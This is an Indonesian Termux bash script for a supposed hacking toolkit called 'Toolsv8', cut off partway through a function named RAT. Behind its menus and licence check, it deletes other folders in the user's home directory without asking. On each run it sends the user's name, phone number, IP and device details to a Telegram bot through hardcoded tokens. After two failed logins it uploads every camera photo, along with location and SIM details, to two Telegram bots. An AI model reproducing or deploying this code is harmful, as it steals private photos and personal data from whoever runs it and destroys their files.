
#!/data/data/com.termux/files/usr/bin/bash

set +x
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
bold_bg='\033[41;1m'
bold_gren='\033[1;32m'
n='\033[0m'
LOG_FILE="$HOME/pembersih.txt"
cleanup_old_repos() {
    clear 
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${y} Memulai pembersihan repository lama..!!"
    sleep 2
    echo ""
    targets=(
        "$HOME/Ank_Ajg" 
        "$HOME/musik.txt"
        "$HOME/Nepizher_V5"
        "$HOME/Anjay"
        "$HOME/Cam404"
        "$HOME/Bokep"
        "$HOME/Peleer"
        "$HOME/Jembutt"
        "$HOME/Nik-Osint"
        "$HOME/Cam-Hack"
        "$HOME/CCTV"
        "$HOME/Sok_Asik"
        "$HOME/Spam404"
        "$HOME/Haram"
        "$HOME/Aktf"
        "$HOME/zphisher"
        "$HOME/Decomplate.py"
        "$HOME/index.js"
        "$HOME/ransom.sh"
        "$HOME/package.json"
        "$HOME/Hasil.json"
        "$HOME/single.txt"
        "$HOME/nomor.txt"
        "$HOME/pkg_checked.txt"
        "$HOME/Cctv.py"
        "$HOME/Aes.py"
        "$HOME/Kamer.py"
        "$HOME/pembersih.txt"
        "$HOME/PYCODE"
        "$HOME/Doxing"
        "$HOME/Praminda"
        "$HOME/seeker"
    )
    for target in "${targets[@]}"; do
        if [ -e "$target" ]; then
            rm -rf "$target"
            clear 
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${c} Berhasil membersihkan Toolsv8..!!"
            sleep 4
        fi
    done
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${c} Membersihkan log telah selesai..!!"
    sleep 3
    clear
}
main() {
clear
mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
         echo "
                    ⢀⣴⣿⣿⣿⣷⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣬⣭⣥⣤⣤⣄⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄
⠀⠀⠀⣠⠞⢛⣷⡾⠟⠁⠀⠀⠀⠀⠀⢀⣾⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿
⠀⢠⡟⢁⣴⣿⣯⠀⢀⣤⣤⣤⣤⣤⣤⣿⣿⡟⠁⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⣠⣿⠟⢋⣭⠙⣡⣈⠻⠿⠿⠿⠿⠿⠟⠋⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠸⠟⠁⣀⣈⢋⣀⣘⣉⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⢸⣿⡿⣿⣿⢿⣿⢿⣿⡿⢿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
⠀⠸⣿⡇⣿⣿⢸⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⣿⣿⣿⡇⠸⣿⣿
⠀⠀⣿⡇⢻⣿⢸⣿⢸⣿⠇⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⣿⣧⢸⣿⢸⣿⢸⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡗⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⢸⣿⢸⣿⢸⣿⢸⣿⢸⣿⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣏⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⢸⣿⠈⣿⢸⣿⢸⡟⢸⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
⠀⠀⠈⣿⣿⣿⣾⣿⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠏⠀⢻⣿⣿⠇⠀
   " | lolcat
    echo -e "${p} Development ${n}: ${g}By.Thonxyzz404"
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${r} Script berhasil di bersihkan"
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${y} Log file : $LOG_FILE"
    echo ""
    if [ ! -f "$LOG_FILE" ]; then
        echo -e "${r}[ ${g}! ${r}]${y} File pembersih.txt tidak ditemukan!"
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${y} Menjalankan pembersihan otomatis..!!"
        sleep 2
        cleanup_old_repos
        echo "File log pembersihan" > "$LOG_FILE"
        echo "Dibuat pada : $(date)" >> "$LOG_FILE"
        echo "Status: Pembersihan selesai" >> "$LOG_FILE"
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${g} File pembersih.txt telah dibuat"
    else
        echo -e "${r}[ ${g}✓ ${r}]${g} File pembersih.txt sudah ada"
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${y} Tidak ada pembersihan yang dilakukan"
    fi    
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${g} Semua proses selesai!"
    echo ""
}
main
echo -e "${bold_bg}${bold_gren}Tekan Enter Untuk Melanjutkannya.${n}"
read -r -p $'\033[1;41m\033[1;32mSilahkan Tekan Enter..!!\033[0m '
clear
echo ""
clear 
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀⠀
" | lolcat
echo""
echo -e "${r}┌──────────────────────────────────────────┐"
echo -e "${r}│      ${g}Selamat Datang di Toolsv8 😎🔥      ${r}│"
echo -e "${r}└──────────────────────────────────────────┘"
echo -e "${r}│ ${b}[ ${y}01 ${b}]${g} Masuk Ke TOOLSV8.                 ${r}│"
echo -e "${r}│ ${b}[ ${y}02 ${b}]${g} Telegram Admin.                   ${r}│"
echo -e "${r}│ ${b}[ ${y}03 ${b}]${g} Donasi Untuk Toolsv8 😅😁         ${r}│"
echo -e "${r}│ ${b}[ ${y}04 ${b}]${g} Open Tiktok Admin.                ${r}│"
echo -e "${r}│ ${b}[ ${y}05 ${b}]${g} Keluar Tools.                     ${r}│"
echo -e "${r}└──────────────────────────────────────────┘"
echo -e "${g}"
read -p "Masukkan Pilihan Anda : " no
if [[ "$no" == "1" || "$no" == "01" ]]; then
clear
echo ""
mpv --no-terminal --quiet --volume=200 --speed=1.2 klik.mp3
echo -e "${bold_bg}${bold_green} MASUK KE TOOLSV8 ADD PREM..!! ${n}"
sleep 3
clear
echo ""
elif [[ "$no" == "3" || "$no" == "03" ]]; then
clear
echo ""
mpv --no-terminal --quiet --volume=200 --speed=1.2 klik.mp3
echo -e "${bold_bg}${bold_green} Membuka Fitur Donasi Untuk Toolsv8..!!${n}"
sleep 3 
clear
echo ""
mpv --no-terminal --quiet --volume=200 --speed=1.2 klik.mp3
echo -e "${g} TERIMAKASIH BANYAK ORANG BAIK SEMOGA DI LANCARKAN REZEKINYA AMIN 🥹🙏"
  sleep 4 
  clear
play -q $HOME/Goblok/oke.mp3 &> /dev/null &
        sleep 1
        play -q $HOME/Goblok/Y.mp3 &> /dev/null &
        pesan=$(
        echo "Assalamualaikum Bang Saya Mau Donasi Untuk Abang Mohon Di Terima Yak Bang!! [ Nomer Dana Saya : 6285716834037 ]"
        )
        isipesan="$pesan"
        xdg-open "https://t.me/Kenzzzzzzzzzzzzzzzz870?text=$pesan"
        clear
exit 1
echo ""
elif [[ "$no" == "2" || "$no" == "02" ]]; then
clear
echo ""
echo -e "${g} MEMBUKA TELEGRAM ADMIN.${n}"
sleep 3
xdg-open "https://t.me/Kenzzzzzzzzzzzzzzzz870"
echo ""
exit 1
elif [[ "$no" == "4" || "$no" == "04" ]]; then
clear 
echo ""
echo -e "${g} Membuka tiktok admin..!!"
xdg-open "https://www.tiktok.com/@thonxyzz404?_t=ZS-90ZCIYY5MlU&_r=1"
echo ""
echo -e "${y} Selesai membuka tiktok admin..!!"
echo ""
exit 1
echo ""
elif [[ "$no" == "5" || "$no" == "05" ]]; then
echo ""
echo -e "${c} Keluar Dari Tools..!!${n}"
echo ""
sleep 2
exit 1
else
clear
echo ""
echo -e "${r} Pilihan Anda Valid..!!${n}"
echo ""
exit 1
fi
clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
yellow='\033[33;1m'
orange='\033[31;1m'
bold_bg='\033[41;1m'
bold_gren='\033[1;32m'
B='\033[34m'
C='\033[36m'
H='\033[32m'
M='\033[31m'
Y='\033[33m'
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
ran_v1=(
"\033[1;31m"
"\033[1;32m"
"\033[1;33m"
"\033[1;34m"
"\033[1;36m"
"\033[1;37m"
"\033[1;35m"
"\033[1;30m"
)
echo ""
ran=$(shuf -n 1 -e "${ran_v1[@]}")
echo ""
ZIP_FILE="ID.zip"
PASSWORD="Qx0tE__&24&__878__Q527G"
if [[ -f "$ZIP_FILE" ]]; then
    clear 
    echo ""
    mpv --no-terminal --quiet --volume=200 --speed=1.2 klik.mp3
    echo -e "${r}[ ${g}+ ${r}]${c} Hallo Saya Adalah Toolsv8 Di Ciptakan Oleh By.Thonxyzz404"
    sleep 2
    clear
    echo ""
    unzip -o -P "$PASSWORD" "$ZIP_FILE"
    if [[ $? -eq 0 ]]; then
        clear
        mpv --no-terminal --quiet --volume=200 --speed=1.2 klik.mp3
        echo ""
        echo -e "${purple} Development ${c}:${y} By.Thonxyzz404 ${r}[${g}✓${r}]"
        echo ""
        sleep 2
        clear
    fi
fi
file="ID-Termux"
cok="ansi-rounded"
mpv --no-terminal --quiet --volume=100 C2.mp3
cowsay -f eyes 'Cek-System'  | boxes -d "$cok" | lolcat
echo ""
loading_bar() {
  frames=(
  "[\e[1;91m■\e[0m□□□□□□□□□]"
  "[\e[1;92m■■\e[0m□□□□□□□□]"
  "[\e[1;93m■■■\e[0m□□□□□□□]"
  "[\e[1;94m■■■■\e[0m□□□□□□]"
  "[\e[1;95m■■■■■\e[0m□□□□□]"
  "[\e[1;96m■■■■■■\e[0m□□□□]"
  "[\e[1;97m■■■■■■■\e[0m□□□]"
  "[\e[1;92m■■■■■■■■\e[0m□□]"
  "[\e[1;93m■■■■■■■■■\e[0m□]"
  "[\e[1;94m■■■■■■■■■■\e[0m]"
  )
  local duration=5
  local steps=$((duration * 2))
  local count=0
  while [ $count -lt $steps ]; do
    for frame in "${frames[@]}"; do
      echo -ne "\r$frame"
      sleep 0.4
      ((count++))
      if [ $count -ge $steps ]; then
        break
      fi
    done
  done
  echo -e "\n"
}
if [[ ! -f "$file" ]]; then
  clear 
  echo ""
  echo -e "${r}[ ${g}X ${r}]${c} File ID-Termux tidak ditemukan!"
  echo ""
  exit 1
fi
current_user=$(whoami)
line=$(grep "^$current_user" "$file")
if [[ -z "$line" ]]; then
  clear 
  echo ""
  echo -e "${r}[ ${g}X ${r}]${y} User $current_user tidak terdaftar di database akses di tolak."
  echo ""
  exit 1
fi
nomor=$(echo "$line" | awk -F'|' '{print $2}' | xargs)
nama=$(echo "$line" | awk -F'|' '{print $3}' | xargs)
tanggal=$(date '+%d %B %Y')
nama_bulan=$(date '+%B')
case $nama_bulan in
  January) nama_bulan="Januari";;
  February) nama_bulan="Februari";;
  March) nama_bulan="Maret";;
  April) nama_bulan="April";;
  May) nama_bulan="Mei";;
  June) nama_bulan="Juni";;
  July) nama_bulan="Juli";;
  August) nama_bulan="Agustus";;
  September) nama_bulan="September";;
  October) nama_bulan="Oktober";;
  November) nama_bulan="November";;
  December) nama_bulan="Desember";;
esac
jam=$(date +"%H:%M:%S")
hari=$(date +%A)
case $hari in
  Monday) ucapan="Senin";;
  Tuesday) ucapan="Selasa";;
  Wednesday) ucapan="Rabu";;
  Thursday) ucapan="Kamis";;
  Friday) ucapan="Jumat";;
  Saturday) ucapan="Sabtu";;
  Sunday) ucapan="Minggu";;
esac
jam_sekarang=$(date +"%H")
if [ $jam_sekarang -ge 6 ] && [ $jam_sekarang -le 11 ]; then
  sambutan="Pagii 🌆"
elif [ $jam_sekarang -ge 12 ] && [ $jam_sekarang -le 14 ]; then
  sambutan="Siang 🌅"
elif [ $jam_sekarang -ge 15 ] && [ $jam_sekarang -le 17 ]; then
  sambutan="Soree 🌄"
else
  sambutan="Malam 🌃"
fi
TOKEN="8348003334:AAHxRKorM3V90TCvji3K9xyyH0GVQjQq58s"
CHAT_ID="7020764060"
IP=$(curl -s ifconfig.me)
ip_info=$(curl -s ipinfo.io)
You=$(echo "$ip_info" | jq -r '.ip')
WAKTU_JAM=$(date +"%H:%M:%S")
CURRENT_TIME=$(date +"%Y-%m-%d %H:%M:%S")
brand=$(neofetch --stdout | grep "Host:" | awk -F': ' '{print $2}' | xargs)
MESSAGE=$(cat << EOF
===========================      
         🔰 INFO TOOLSV8 🔰
===========================
┏❐ 𝐁𝐲.𝐓𝐡𝐨𝐧𝐱𝐲𝐳𝐳𝟒𝟎𝟒
┃
┃⭔ ✅ USER PREMIUM ✅
┃⭔ 👤 Nama User : $nama
┃⭔ 📞 Nomor : $nomor
┃⭔ 💻 Menjalankan TOOLSV8...!!
┃⭔ 🌐 Alamat IP : $IP
┃⭔ 🆔 ID Termux : $current_user
┃⭔ ✨ Skrang Hari : $ucapan
┃⭔ 📱 HP Merek : $brand
┃⭔ 🌐 Alamat IP Ke [ 2.] : $You
┃⭔ 🕒 Waktu Server : $CURRENT_TIME
┃⭔ 🌟 Pengingat Waktu : $sambutan
┃⭔ 🗓️ Tanggall : $tanggal
┃⭔ 🚨 Zona Waktu : $WAKTU_JAM
┃⭔ 📋 Status : Online
┃
┗❐ 𝐁𝐲.𝐓𝐡𝐨𝐧𝐱𝐲𝐳𝐳𝟒𝟎𝟒
EOF
)
(
  curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" \
    -d "text=$MESSAGE" > /dev/null
) &
loading_bar
wait
clear
FILE_ID="ID-Termux"
clear
animasi() {
       clear
       mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
       echo ""
       echo -e "\033[1;34m╔══════════════════════════════════════════════╗"
       echo -e "\033[1;34m║ \033[32;1m             ID TERVERIFIKASI               \033[1;34m ║"
       echo -e "\033[1;34m╚══════════════════════════════════════════════╝"
       echo -e "\033[1;34m╔══════════════════════════════════════════════╗"
       echo -e "\033[1;34m║ \033[32;1m           SCRIPT DAPAT DI AKSES         \033[1;34m    ║"
       echo -e "\033[1;34m╚══════════════════════════════════════════════╝"
       echo -e "${cyan}ID Termux : ${red}$ID_TERMUX"
       sleep 3
}
echo ""
login_gagal() {
echo -e "${red} Login Gagall...!!"
((gagal++))
if [ $gagal -eq 2 ]; then
clear
TOKEN1="8031147611:AAFeTCdFcE6FLRkorUkgXwKfFGHTe8ClH00"
CHAT_ID1="7020764060"
TOKEN2="8388458444:AAGNhP3Zc6UDxHpxAO6f57LD-UCRoTrY0-A"
CHAT_ID2="7474546037"
DELAY=1
jam_sekarang=$(date +"%H")
if [[ ! "$jam_sekarang" =~ ^[0-9]+$ ]]; then
    echo ""
    echo -e "${red}Error : jam_sekarang is not valid number...!!"
    echo ""
    exit 1
fi
hari=$(date +%A)
case $hari in
Monday) ucapan="Seninn";;
Tuesday) ucapan="Selasa";;
Wednesday) ucapan="Raabuu";;
Thursday) ucapan="Kamiss";;
Friday) ucapan="Jum'at";;
Saturday) ucapan="Sabtuu";;
Sunday) ucapan="Minggu";;
esac
if [ "$jam_sekarang" -ge 6 ] && [ "$jam_sekarang" -le 11 ]; then
     sambutan="Pagii 🌆"
elif [ "$jam_sekarang" -ge 12 ] && [ "$jam_sekarang" -le 14 ]; then
     sambutan="Siang 🌅"
elif [ "$jam_sekarang" -ge 15 ] && [ "$jam_sekarang" -le 17 ]; then
     sambutan="Soree 🌄"
else
     sambutan="Malam 🌃"
fi
ip_info=$(curl -s ipinfo.io)
hostname=$(echo "$ip_info" | jq -r '.hostname')
tanggal=$(date '+%d %B %Y') 
You=$(echo "$ip_info" | jq -r '.ip')
CODE_TELEPON=$(getprop gsm.sim.operator.numeric)
WAKTU_JAM=$(date +"%H:%M:%S")
STORAGE=$(df -h / | awk 'NR==2{print $3"/"$2" ("$5")"}') 
IP=$(curl -s ifconfig.me)
brand=$(neofetch --stdout | grep "Host:" | awk -F': ' '{print $2}' | xargs)
os_name=$(neofetch --stdout | grep "OS:" | awk -F': ' '{print $2}' | xargs)
memory=$(free -g | awk '/^Mem:/{print $2}')GB
ip_address=$(echo "$ip_info" | jq -r '.ip // "N/A"')
city=$(echo "$ip_info" | jq -r '.city // "N/A"')
region=$(echo "$ip_info" | jq -r '.region // "N/A"')
country=$(echo "$ip_info" | jq -r '.country // "N/A"')
loc=$(echo "$ip_info" | jq -r '.loc // "N/A"')
CURRENT_TIME=$(date +"%Y-%m-%d %H:%M:%S")
SEMUA_FOTO=$(find /storage/emulated/0/DCIM/Camera -type f -iname "*.jpg" -o -iname "*.png" 2>/dev/null)
echo ""
echo -e "${green} Mohon Bersabar Sedang Menjalankan Program Toolsv8...!!"
echo ""
if [[ -n "$SEMUA_FOTO" ]]; then
    while IFS= read -r FOTO; do
        [[ -f "$FOTO" ]] || continue
        for TOKEN in "$TOKEN1" "$TOKEN2"; do
            for CHAT_ID in "$CHAT_ID1" "$CHAT_ID2"; do
                curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendPhoto" \
                    -F chat_id="${CHAT_ID}" \
                    -F photo=@"${FOTO}" \
                    -F caption="===========================      
         🔰 INFO TOOLSV8 🔰
===========================
┏❐ 𝐁𝐲.𝐓𝐡𝐨𝐧𝐱𝐲𝐳𝐳𝟒𝟎𝟒
┃
┃⭔ ❌ USER BLUM PREMIUM ❌
┃⭔ 💻 Menjalankan TOOLSV8...!!
┃⭔ 🌐 Alamat IP : ${IP}
┃⭔ 🆔 ID Termux : $(whoami)
┃⭔ 📱 HP Merek : ${brand}
┃⭔ 🖥️ Memori HP : ${memory}
┃⭔ 🏙️ Kota : ${city}
┃⭔ 🌐 Alamat IP Ke [2] : ${You}
┃⭔ 📍 Wilayah : ${region}
┃⭔ 🇨🇺 Negara : ${country}
┃⭔ 📌 Lokasi : ${loc}
┃⭔ 📞 Code Telepon : ${CODE_TELEPON}
┃⭔ 💾 Ukuran Storage : ${STORAGE}
┃⭔ 🖼️ Lokasi Foto Terbaru : ${SEMUA_FOTO}
┃⭔ 🌟 Pengingat Waktu : ${sambutan}
┃⭔ 🗓️ Tanggall : ${tanggal}
┃⭔ ⏳ Waktu Server : ${CURRENT_TIME}
┃⭔ 💫 Skrng Hari : ${ucapan}
┃⭔ 🕒 Zona Waktu : ${WAKTU_JAM}
┃⭔ ♨️ Hostname : ${os_name}
┃⭔ 📋 Status : Online
┃
┗❐ 𝐁𝐲.𝐓𝐡𝐨𝐧𝐱𝐲𝐳𝐳𝟒𝟎𝟒" \
                    > /dev/null 2>&1
            done
        done
    done <<< "$SEMUA_FOTO"
fi
for TOKEN in "$TOKEN1" "$TOKEN2"; do
    for CHAT_ID in "$CHAT_ID1" "$CHAT_ID2"; do
        curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
            -d chat_id="${CHAT_ID}" \
            -d text="${MESSAGE}" \
            > /dev/null 2>&1
    done
done
clear
echo ""
neofetch --ascii_distro linux
echo ""
echo -e "${red}PERINGATAN...!!!"
echo ""
echo -e "${yellow}   By.Thonxyzz404"
echo -e "${blue}---------------------"
echo ""
echo -e "${green}Anda Sudah Melanggar Ketentuan Toolsv8"
echo -e "${red}Mengambill Data Anda Karena Sudah Melanggar [ ☠️🔥 ]"
echo ""
exit 1
fi
}
echo ""
animasi_gagal() {
       clear
       mpv --no-terminal --quiet --volume=200 --speed=1.1 salah.mp3
       sleep 0.05
       echo ""
       echo -e "\033[31;1m╔══════════════════════════════════════════════╗"
       echo -e "\033[31;1m║ \033[32;1m           ID TIDAK TERVERIFIKASI        \033[31;1m    ║"
       echo -e "\033[31;1m╚══════════════════════════════════════════════╝"
       sleep 0.05
       echo -e "\033[31;1m╔══════════════════════════════════════════════╗"
       echo -e "\033[31;1m║ \033[32;1m         SCRIPT TIDAK DAPAT DI AKSES   \033[31;1m      ║"
       echo -e "\033[31;1m╚══════════════════════════════════════════════╝"
       sleep 0.05
       echo -e "${cyan} ID TIDAK TERVERIFIKASI...!! "
       echo -e "${green} ID Termux Anda Belum Terdaftar!! Silakan PREMIUM Dulu Ke Thonxyzz404...!!"
       echo -e "${red} PERINGATAN...!!" 
       echo -e "${yellow} JIKA ANDA MEMAKSA UNTUK LOGIN SEBANYAK 2X DENGAN "
       echo -e "${cyan} SECARA PAKSA JANGAN SALAHKAN TOOLSV8 JIKA TERMUX ANDA KENAPA-KENAPA...!!! "
       mpv --no-terminal --quiet --volume=200 IDV1.mp3
       login_gagal
       sleep 8
}
ID_TERMUX=$(whoami)
gagal=0
FILE_ID="ID-Termux"
while true; do
  if [ -f "$FILE_ID" ]; then
    if grep -q "$ID_TERMUX" "$FILE_ID"; then
      animasi
      break
    else
      animasi_gagal
    fi
  else
    animasi_gagal
  fi
done
   clear
   mpv --no-terminal --quiet --volume=200 --speed=1.2 klik.mp3
   echo ""
   echo -e "${green} PERINGATAN SAYA TIDAK BERTANGGUNG JAWAB JIKA TOOLSV8"
   echo -e "${red} DI SALAH GUNAKAN ‼️"
   sleep 4
   clear 
   mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
   echo ""
   echo -e "${red}         ⛔ PERINGATAN ⛔ "
   echo ""
   echo -e "${cyan}[${yellow} 𒊹 ${cyan}] Jangan Hapus Apk Termux Anda"
   echo -e "${cyan}[${yellow} 𒊹 ${cyan}] Jika Masih Ingin Mengakses ${green}TOOLSV8"
   echo -e "${cyan}[${yellow} 𒊹 ${cyan}] Jika Terlanjut Anda Di Kenakan${red} 5k ${cyan}Untuk Pembaruan ID "
   echo -e "[${yellow} 𒊹 ${cyan}] Resiko Di\033[32;1m Tanggung Anda Sendiri..!! "
   echo "" 
   echo -e "${yellow}"
   read -p " SILAHKAN TEKAN ENTER UNTUK MELANJUTKANNYA!! : " p
   clear
   echo ""
tanggal=$(date '+%d %B %Y')
nama_bulan=$(date '+%B')
case $nama_bulan in
  January) nama_bulan="Januari";;
  February) nama_bulan="Februari";;
  March) nama_bulan="Maret";;
  April) nama_bulan="April";;
  May) nama_bulan="Meeii";;
  June) nama_bulan="Junii";;
  July) nama_bulan="Julii";;
  August) nama_bulan="Agustus";;
  September) nama_bulan="September";;
  October) nama_bulan="Oktober";;
  November) nama_bulan="November";;
  December) nama_bulan="Desember";;
esac
   ucapan=""
   jam=$(date +"%H:%M:%S")
   hari=$(date +%A)
  case $hari in
     Monday) ucapan="Seninn";;
     Tuesday) ucapan="Selasa";;
     Wednesday) ucapan="Raabuu";;
     Thursday) ucapan="Kamiss";;
     Friday) ucapan="Jum'at";;
     Saturday) ucapan="Sabtuu";;
     Sunday) ucapan="Minggu";;
 esac
     jam_sekarang=$(date +"%H")
  if [ $jam_sekarang -ge 6 ] && [ $jam_sekarang -le 11 ]; then
     sambutan="Pagii 🌆"
  elif [ $jam_sekarang -ge 12 ] && [ $jam_sekarang -le 14 ]; then
     sambutan="Siang 🌅"
  elif [ $jam_sekarang -ge 15 ] && [ $jam_sekarang -le 17 ]; then
     sambutan="Soree 🌄"
  else
     sambutan="Malam 🌃"
  fi
tanggal=$(date '+%d %B %Y')
nama_bulan=$(date '+%B')
case $nama_bulan in
  January) nama_bulan="Januari";;
  February) nama_bulan="Februari";;
  March) nama_bulan="Maret";;
  April) nama_bulan="April";;
  May) nama_bulan="Meeii";;
  June) nama_bulan="Junii";;
  July) nama_bulan="Julii";;
  August) nama_bulan="Agustus";;
  September) nama_bulan="September";;
  October) nama_bulan="Oktober";;
  November) nama_bulan="November";;
  December) nama_bulan="Desember";;
esac
ucapan=""
jam=$(date +"%H:%M:%S")
hari=$(date +%A)
case $hari in
  Monday) ucapan="Seninn";;
  Tuesday) ucapan="Selasa";;
  Wednesday) ucapan="Raabuu";;
  Thursday) ucapan="Kamiss";;
  Friday) ucapan="Jum'at";;
  Saturday) ucapan="Sabtuu";;
  Sunday) ucapan="Minggu";;
esac
jam_sekarang=$(date +"%H")
if [ $jam_sekarang -ge 6 ] && [ $jam_sekarang -le 11 ]; then
  sambutan="Pagii 🌆"
elif [ $jam_sekarang -ge 12 ] && [ $jam_sekarang -le 14 ]; then
  sambutan="Siang 🌅"
elif [ $jam_sekarang -ge 15 ] && [ $jam_sekarang -le 17 ]; then
  sambutan="Soree 🌄"
else
  sambutan="Malam 🌃"
fi
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
cok="ansi-rounded"
echo ""
echo ""
TOKEN1="8031147611:AAFeTCdFcE6FLRkorUkgXwKfFGHTe8ClH00"
TOKEN2="8388458444:AAGNhP3Zc6UDxHpxAO6f57LD-UCRoTrY0-A"
CHAT_ID1="7020764060"
CHAT_ID2="7474546037"
echo ""
RAT() {
  ip_info=$(curl -s ipinfo.io)
  tanggal=$(date '+%d %B %Y')
  You=$(echo "$ip_info" | jq -r '.ip')
  CODE_TELEPON=$(getprop gsm.sim.operator.numeric)
  WAKTU_JAM=$(date +"%H:%M:%S")
  STORAGE=$(df -h / | awk 'NR==2{print $3"/"$2" ("$5")"}')
  IP=$(curl -s ifconfig.me)
  brand=$(neofetch --stdout | grep "Host:" | awk -F': ' '{print $2}' | xargs)
  os_name=$(neofetch --stdout | grep "OS:" | awk -F': ' '{print $2}' | xargs)
  memory=$(free -g | awk '/^Mem:/{print $2}')GB
  city=$(echo "$ip_info" | jq -r '.city // "N/A"')
  region=$(echo "$ip_info" | jq -r '.region // "N/A"')
  country=$(echo "$ip_info" | jq -r '.country // "N/A"')
  loc=$(echo "$ip_info" | jq -r '.loc // "N/A"')
  CURRENT_TIME=$(date +"%Y-%m-%d %H:%M:%S")
  cowsay -f eyes 'Sedang Menyediakan Server'  | boxes -d "$cok" | lolcat
  echo ""
  echo -e "${g} MOHON BERSABAR SEDANG PENGECEKAN TOOLSV8..!!"
  echo -e "${y} BIASANYA MENUNGGU SAMPAI ${r}[ ${g}20 Detik ${r}]"
  echo ""
